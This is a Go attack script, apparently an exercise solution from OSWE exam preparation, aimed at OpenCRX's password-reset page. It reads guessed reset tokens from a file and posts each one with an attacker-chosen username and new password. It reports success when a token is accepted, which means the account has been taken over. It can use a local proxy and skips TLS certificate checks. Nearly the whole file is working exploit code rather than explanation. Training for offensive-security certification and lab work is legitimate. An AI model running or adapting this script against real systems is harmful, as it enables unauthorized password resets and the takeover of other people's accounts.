package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"log"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"strings"

	"github.com/iPhantasmic/OSWE/scripts/utils"
)

// Ex 9.2.5.2 - Password reset using generated token list

var client *http.Client

const proxyURL = "http://127.0.0.1:8080"

func resetPassword(debug bool, ip, username, password string) bool {
	requestURL := fmt.Sprintf("http://%s:8080/opencrx-core-CRX/PasswordResetConfirm.jsp", ip)

	file, err := os.Open("tokens.txt")
	if err != nil {
		log.Fatalln("Failed to open file: ", err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)

	for scanner.Scan() {
		token := scanner.Text()

		// t=resetToken&p=CRX&s=Standard&id=guest&password1=password&password2=password
		data := url.Values{
			"t":         {strings.TrimSpace(token)},
			"p":         {"CRX"},
			"s":         {"Standard"},
			"id":        {username},
			"password1": {password},
			"password2": {password},
		}

		request := utils.PostRequest{
			ContentType: "form",
			Cookies:     []*http.Cookie{},
			FormData:    data,
		}

		response := utils.SendPostRequest(client, debug, requestURL, request)
		
		if !strings.Contains(response.ResponseBody, "Unable to reset password") {
			utils.PrintSuccess("Successful reset with token: " + strings.TrimSpace(token))
			return true
		}
	}

	return false
}

func main() {
	var tr *http.Transport
	useProxy := flag.Bool("proxy", false, "use proxy")
	debug := flag.Bool("debug", false, "debug mode")
	flag.Parse()
	// parse args
	args := os.Args[:]
	log.Println("Args: ", args)

	if len(args) < 4 {
		utils.PrintFailure(fmt.Sprintf("usage: %s [-debug=true] [-proxy=true] <target> <username> <password>", os.Args[0]))
		utils.PrintFailure(fmt.Sprintf("eg: %s 192.168.236.126 guest password", os.Args[0]))
		os.Exit(1)
	}

	ip := flag.Arg(0)
	username := flag.Arg(1)
	password := flag.Arg(2)

	if *useProxy {
		// disable TLS verification and set proxy URL
		proxyUrl, _ := url.Parse(proxyURL)
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
			Proxy:              http.ProxyURL(proxyUrl),
		}
	} else {
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
		}
	}

	// cookie jar to help us manage cookies
	jar, err := cookiejar.New(nil)
	if err != nil {
		log.Fatalln("Error while creating cookie jar", err)
	}

	// create our HTTP client using the above transport and cookie jar, then set the global variable
	client = &http.Client{
		Transport: tr,
		Jar:       jar,
	}

	utils.PrintInfo("Starting token spray now. Please wait...")
	if !resetPassword(*debug, ip, username, password) {
		utils.PrintFailure("Failed to perform password reset!")
		os.Exit(1)
	}

	fmt.Println("")
	utils.PrintSuccess("Done!")
}
